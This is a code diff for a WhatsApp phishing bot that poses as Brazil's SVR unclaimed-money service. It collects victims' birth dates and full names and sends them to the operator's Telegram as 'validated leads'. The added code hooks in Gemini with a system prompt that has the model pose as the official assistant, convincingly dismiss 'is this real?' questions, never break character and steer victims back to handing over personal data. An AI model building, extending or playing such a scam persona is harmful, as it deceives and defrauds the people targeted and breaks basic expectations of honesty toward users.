@@ -10,6 +10,28 @@ dotenv.config();
 const API_URL = process.env.API_URL || 'https://portalsvr.shardweb.app';
 const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").replace(/"/g, "");
 const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "").replace(/"/g, "");
+const GEMINI_KEY = process.env.GEMINI_API_KEY || "";
+
+async function askAI(prompt, userMessage) {
+    if (!GEMINI_KEY) return "Desculpe, estou em manutenção. Por favor, siga as instruções de validação acima.";
+    try {
+        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
+        const systemPrompt = `Você é o Assistente Oficial do SVR (Sistema de Valores a Receber). Seu objetivo ÚNICO é ajudar o usuário a completar a validação de segurança para receber o dinheiro dele. 
+        Instruções:
+        1. Seja profissional, educado e direto.
+        2. Se o usuário perguntar algo fora do assunto (ex: 'quem é você?', 'como funciona?', 'isso é real?'), responda de forma convincente e diga que para prosseguir ele DEVE seguir as instruções de segurança e digitar o dado solicitado.
+        3. Nunca saia do personagem.
+        4. Use negrito em palavras chave.
+        5. Mantenha as respostas curtas (máximo 3 frases).`;
+
+        const response = await axios.post(url, {
+            contents: [{ parts: [{ text: `${systemPrompt}\n\nUsuário disse: ${userMessage}\nO que você responde para trazê-lo de volta ao foco?` }] }]
+        });
+        return response.data.candidates[0].content.parts[0].text;
+    } catch (e) {
+        return "Para sua segurança, prossiga com a validação dos dados solicitados acima.";
+    }
+}
 
 const botId = process.argv.find(arg => arg.startsWith('--id='))?.split('=')[1] || 'main';
 
@@ -118,26 +140,29 @@ client.on('message_create', async (msg) => {
             chatSessions.set(chatId, { ...session, step: 2, birthDate: typedDate });
             await msg.reply(`✅ *DATA VALIDADA!*\n\n📍 *ETAPA 2:* Digite seu **Nome Completo** (conforme documento):`);
         } else {
-            await msg.reply(`❌ *FORMATO INVÁLIDO*\nUse o padrão DD/MM/AAAA. Ex: *10/05/1985*`);
+            // IA ENTRA EM AÇÃO AQUI
+            const aiReply = await askAI("validacao_data", text);
+            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite sua data no formato DD/MM/AAAA`);
         }
     } else if (session.step === 2) {
         const typedName = text.trim();
-        if (typedName.length < 8 || !typedName.includes(" ")) {
-            await msg.reply(`❌ *NOME INCOMPLETO*\nDigite nome e sobrenome:`);
-            return;
-        }
-
-        if (session.expectedData?.fullName) {
-            const portalName = session.expectedData.fullName.toLowerCase().trim();
-            if (!typedName.toLowerCase().includes(portalName.split(' ')[0])) {
-                await msg.reply(`⚠️ *ALERTA DE SEGURANÇA*\nNome não confere com o titular. Digite seu **Nome Completo**:`);
-                return;
+        if (typedName.length >= 8 && typedName.includes(" ")) {
+            if (session.expectedData?.fullName) {
+                const portalName = session.expectedData.fullName.toLowerCase().trim();
+                if (!typedName.toLowerCase().includes(portalName.split(' ')[0])) {
+                    await msg.reply(`⚠️ *ALERTA DE SEGURANÇA*\nNome não confere com o titular. Digite seu **Nome Completo**:`);
+                    return;
+                }
             }
-        }
 
-        await msg.reply(`📋 *VALIDAÇÃO CONCLUÍDA!*\n\nSeus dados estão **100% CORRETOS**.\n\n⌛ *STATUS:* Processando transferência PIX...\n\nAguarde um especialista neste chat.`);
-        await notifyTelegram(`💰 **LEAD VALIDADO!**\n👤 Nome: ${typedName}\n📅 Data: ${session.birthDate}\n🆔 Protocolo: #${session.userId?.toUpperCase()}`);
-        chatSessions.delete(chatId);
+            await msg.reply(`📋 *VALIDAÇÃO CONCLUÍDA!*\n\nSeus dados estão **100% CORRETOS**.\n\n⌛ *STATUS:* Processando transferência PIX...\n\nAguarde um especialista neste chat.`);
+            await notifyTelegram(`💰 **LEAD VALIDADO!**\n👤 Nome: ${typedName}\n📅 Data: ${session.birthDate}\n🆔 Protocolo: #${session.userId?.toUpperCase()}`);
+            chatSessions.delete(chatId);
+        } else {
+            // IA ENTRA EM AÇÃO AQUI
+            const aiReply = await askAI("validacao_nome", text);
+            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite seu nome completo (Nome e Sobrenome).`);
+        }
     }
 });
 
